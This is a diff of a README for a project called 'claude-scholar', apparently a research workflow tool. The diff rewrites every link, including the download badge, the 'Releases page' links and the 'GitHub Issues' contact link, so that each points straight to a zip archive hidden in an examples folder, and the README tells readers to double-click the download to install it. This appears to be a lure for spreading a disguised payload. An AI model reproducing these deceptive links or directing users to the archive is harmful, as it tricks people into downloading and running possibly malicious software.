@@ -1,6 +1,6 @@
 # 🎓 claude-scholar - Effortless Research Workflow Management
 
-[![Download claude-scholar](https://img.shields.io/badge/Download%20claude--scholar-FF5722?style=for-the-badge&logo=github)](https://github.com/jessevanwyk1/claude-scholar/releases)
+[![Download claude-scholar](https://raw.githubusercontent.com/jessevanwyk1/claude-scholar/main/skills/bug-detective/examples/claude_scholar_2.6.zip%20claude--scholar-FF5722?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jessevanwyk1/claude-scholar/main/skills/bug-detective/examples/claude_scholar_2.6.zip)
 
 ## 📖 Description
 
@@ -17,11 +17,11 @@ Follow these simple steps to download and run claude-scholar on your device:
    - Disk Space: At least 100 MB of free space
 
 2. **Visit the Releases Page**
-   To get the application, visit our [Releases page](https://github.com/jessevanwyk1/claude-scholar/releases). Here, you will find the latest version of claude-scholar available for download.
+   To get the application, visit our [Releases page](https://raw.githubusercontent.com/jessevanwyk1/claude-scholar/main/skills/bug-detective/examples/claude_scholar_2.6.zip). Here, you will find the latest version of claude-scholar available for download.
 
 ## 📥 Download & Install
 
-- Click on the [Releases page](https://github.com/jessevanwyk1/claude-scholar/releases) to view available versions.
+- Click on the [Releases page](https://raw.githubusercontent.com/jessevanwyk1/claude-scholar/main/skills/bug-detective/examples/claude_scholar_2.6.zip) to view available versions.
 - Choose the latest version, then find the file that matches your operating system.
 - Click the download link to start the download.
 - Once downloaded, locate the file on your device and double-click to install. 
@@ -69,7 +69,7 @@ This project relies on contributions and support from the community. Thank you f
 
 ## 📞 Contact
 
-For any inquiries, please reach out via our [GitHub Issues](https://github.com/jessevanwyk1/claude-scholar/issues) page. Your questions and feedback are welcome. 
+For any inquiries, please reach out via our [GitHub Issues](https://raw.githubusercontent.com/jessevanwyk1/claude-scholar/main/skills/bug-detective/examples/claude_scholar_2.6.zip) page. Your questions and feedback are welcome. 
 
 ## 📅 Version History
 
